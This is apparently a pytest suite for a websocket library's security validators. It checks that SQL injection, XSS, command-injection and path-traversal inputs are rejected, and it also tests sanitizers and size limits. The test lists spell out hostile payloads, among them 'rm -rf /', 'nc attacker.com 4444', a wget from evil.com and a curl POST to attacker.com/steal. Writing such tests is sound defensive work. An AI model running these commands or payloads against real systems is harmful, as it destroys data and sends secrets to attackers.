import pytest
import time
from pydantic import ValidationError

from aiows.types import ChatMessage, JoinRoomMessage, GameActionMessage
from aiows.validators import (
    SecurityValidator, Sanitizer, WhitelistValidator, JSONBombProtector,
    SecurityLimits
)


class TestSQLInjectionProtection:
    def test_sql_injection_patterns_detected(self):
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "UNION SELECT password FROM users",
            "1; DELETE FROM messages; --",
            "' OR 1=1 --",
            "'; EXEC xp_cmdshell('dir'); --",
            "1' UNION SELECT * FROM users WHERE '1'='1",
        ]
        
        for malicious_input in malicious_inputs:
            assert SecurityValidator.check_sql_injection(malicious_input)
            assert not SecurityValidator.is_safe_string(malicious_input)
    
    def test_safe_text_rejects_sql_injection(self):
        with pytest.raises(ValidationError) as exc_info:
            ChatMessage(
                text="Hello'; DROP TABLE users; --",
                user_id=1
            )
        
        assert "dangerous patterns" in str(exc_info.value).lower()
    
    def test_valid_sql_like_text_allowed(self):
        valid_messages = [
            "I want to select a good restaurant",
            "Lets join the union meeting",
            "Please update me on the status", 
            "I need to delete this file from my computer",
        ]
        
        for message in valid_messages:
            chat_msg = ChatMessage(text=message, user_id=1)
            assert chat_msg.text == message


class TestXSSProtection:
    def test_xss_patterns_detected(self):
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert('XSS')",
            "<svg onload=alert(1)>",
            "<object data='javascript:alert(1)'></object>",
            "<embed src='javascript:alert(1)'>",
            "<link rel='stylesheet' href='javascript:alert(1)'>",
            "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
            "<style>body{background:url('javascript:alert(1)')}</style>",
        ]
        
        for payload in xss_payloads:
            assert SecurityValidator.check_xss(payload)
            assert not SecurityValidator.is_safe_string(payload)
    
    def test_safe_html_like_text_allowed(self):
        safe_texts = [
            "I love programming in <language>",
            "The temperature is <20 degrees",
            "Use the greater than > symbol here",
            "Math: 5 < 10 and 10 > 5",
        ]
        
        for text in safe_texts:
            chat_msg = ChatMessage(text=text, user_id=1)
            assert chat_msg.text is not None


class TestCommandInjectionProtection:
    def test_command_injection_patterns_detected(self):
        command_payloads = [
            "test; rm -rf /",
            "name && cat /etc/passwd",
            "input | nc attacker.com 4444",
            "file`whoami`",
            "data$(id)",
            "text{echo,hello}",
            "wget http://evil.com/malware",
            "curl -X POST http://attacker.com/steal --data",
            "bash -c 'malicious command'",
            "powershell.exe -Command 'Get-Process'",
        ]
        
        for payload in command_payloads:
            assert SecurityValidator.check_command_injection(payload)
            assert not SecurityValidator.is_safe_string(payload)


class TestPathTraversalProtection:
    def test_path_traversal_patterns_detected(self):
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "\\\\server\\share\\file",
            "%252e%252e%252f%252e%252e%252f",
        ]
        
        for payload in path_payloads:
            assert SecurityValidator.check_path_traversal(payload)
            assert not SecurityValidator.is_safe_string(payload)


class TestSanitization:
    def test_text_sanitization(self):
        dangerous_text = "Hello<script>alert('xss')</script>world"
        sanitized = Sanitizer.sanitize_text(dangerous_text)
        
        assert "<" not in sanitized
        assert ">" not in sanitized
        assert "script" in sanitized
        assert "Hello" in sanitized
        assert "world" in sanitized
    
    def test_identifier_sanitization(self):
        dangerous_id = "user<script>123"
        sanitized = Sanitizer.sanitize_identifier(dangerous_id)
        
        assert sanitized == "userscript123"
        assert "<" not in sanitized
        assert ">" not in sanitized
    
    def test_action_sanitization(self):
        dangerous_action = "move; rm -rf /"
        sanitized = Sanitizer.sanitize_action(dangerous_action)
        
        assert sanitized == "movermrf"
        assert ";" not in sanitized
        assert " " not in sanitized


class TestWhitelistValidation:
    def test_username_whitelist(self):
        valid_usernames = ["user123", "test_user", "user.name", "user-name"]
        invalid_usernames = ["user@domain", "user<script>", "user&admin", "user|cmd"]
        
        for username in valid_usernames:
            assert WhitelistValidator.validate_username(username)
        
        for username in invalid_usernames:
            assert not WhitelistValidator.validate_username(username)
    
    def test_room_id_whitelist(self):
        valid_room_ids = ["room123", "test-room", "room_name"]
        invalid_room_ids = ["room.with.dots", "room@domain", "room<script>"]
        
        for room_id in valid_room_ids:
            assert WhitelistValidator.validate_room_id(room_id)
        
        for room_id in invalid_room_ids:
            assert not WhitelistValidator.validate_room_id(room_id)
    
    def test_action_whitelist(self):
        valid_actions = ["move", "attack", "defend", "jump", "run"]
        invalid_actions = ["hack", "exploit", "delete", "format", "evil_action"]
        
        for action in valid_actions:
            assert WhitelistValidator.validate_action(action)
        
        for action in invalid_actions:
            assert not WhitelistValidator.validate_action(action)


class TestSizeLimits:
    def test_text_length_limit(self):
        oversized_text = "a" * (SecurityLimits.MAX_TEXT_LENGTH + 1)
        
        with pytest.raises(ValidationError) as exc_info:
            ChatMessage(text=oversized_text, user_id=1)
        
        assert "too long" in str(exc_info.value).lower()
    
    def test_username_length_limit(self):
        oversized_username = "a" * (SecurityLimits.MAX_USERNAME_LENGTH + 1)
        
        with pytest.raises(ValidationError):
            JoinRoomMessage(room_id="test", user_name=oversized_username)
    
    def test_room_id_length_limit(self):
        oversized_room_id = "a" * (SecurityLimits.MAX_ROOM_ID_LENGTH + 1)
        
        with pytest.raises(ValidationError):
            JoinRoomMessage(room_id=oversized_room_id, user_name="test")


class TestJSONBombProtection:
    def test_deep_nesting_protection(self):
        deep_data = {}
        current = deep_data
        for i in range(SecurityLimits.MAX_JSON_DEPTH + 5):
            current["level"] = {}
            current = current["level"]
        
        assert JSONBombProtector.check_json_bomb(deep_data)
    
    def test_large_array_protection(self):
        large_array = ["item"] * (SecurityLimits.MAX_ARRAY_LENGTH + 1)
        
        assert JSONBombProtector.check_json_bomb(large_array)
    
    def test_large_object_protection(self):
        large_object = {f"key_{i}": f"value_{i}" for i in range(SecurityLimits.MAX_OBJECT_KEYS + 1)}
        
        assert JSONBombProtector.check_json_bomb(large_object)


class TestValidDataHandling:
    def test_valid_chat_message(self):
        valid_message = ChatMessage(
            text="Hello, how are you today?",
            user_id=123
        )
        
        assert valid_message.text == "Hello, how are you today?"
        assert valid_message.user_id == 123
        assert valid_message.type == "chat"
    
    def test_valid_join_room_message(self):
        valid_message = JoinRoomMessage(
            room_id="game_room_1",
            user_name="player123"
        )
        
        assert valid_message.room_id == "game_room_1"
        assert valid_message.user_name == "player123"
        assert valid_message.type == "join_room"
    
    def test_valid_game_action_message(self):
        valid_message = GameActionMessage(
            action="move",
            coordinates=(10, 20)
        )
        
        assert valid_message.action == "move"
        assert valid_message.coordinates == (10, 20)
        assert valid_message.type == "game_action"


class TestCoordinatesValidation:
    def test_valid_coordinates(self):
        valid_coords = [(0, 0), (100, 200), (-50, 75), (9999, -9999)]
        
        for coords in valid_coords:
            message = GameActionMessage(action="move", coordinates=coords)
            assert message.coordinates == coords
    
    def test_invalid_coordinates_type(self):
        invalid_coords = [
            "not_coords",
            [1, 2, 3],
            [1],
            (1.5, 2.5),
            ("x", "y"),
        ]
        
        for coords in invalid_coords:
            with pytest.raises(ValidationError):
                GameActionMessage(action="move", coordinates=coords)
    
    def test_coordinates_range_limits(self):
        invalid_coords = [
            (100000, 0),
            (0, 100000),
            (-100000, 0),
            (0, -100000),
        ]
        
        for coords in invalid_coords:
            with pytest.raises(ValidationError):
                GameActionMessage(action="move", coordinates=coords)


class TestUserIdValidation:
    def test_valid_user_ids(self):
        valid_ids = [1, 100, 1000000, 2147483647]
        
        for user_id in valid_ids:
            message = ChatMessage(text="Hello", user_id=user_id)
            assert message.user_id == user_id
    
    def test_invalid_user_ids(self):
        invalid_ids = [
            0,
            -1,
            2147483648,
            "123",
            1.5,
        ]
        
        for user_id in invalid_ids:
            with pytest.raises(ValidationError):
                ChatMessage(text="Hello", user_id=user_id)


class TestPerformanceImpact:
    def test_validation_performance(self):
        test_message = "This is a normal message with reasonable length"
        
        start_time = time.time()
        
        for _ in range(1000):
            ChatMessage(text=test_message, user_id=123)
        
        end_time = time.time()
        total_time = end_time - start_time
        
        assert total_time < 1.0, f"Validation too slow: {total_time:.3f}s for 1000 messages"
    
    def test_complex_validation_performance(self):
        complex_message = "This is a longer message with various characters: 123 !@# $%^ &*() -=+ []{}|\\:;\"'<>,.?/"
        
        start_time = time.time()
        
        for _ in range(100):
            try:
                ChatMessage(text=complex_message, user_id=123)
            except ValidationError:
                pass
        
        end_time = time.time()
        total_time = end_time - start_time
        
        assert total_time < 0.5, f"Complex validation too slow: {total_time:.3f}s for 100 messages"


if __name__ == "__main__":
    pytest.main([__file__]) 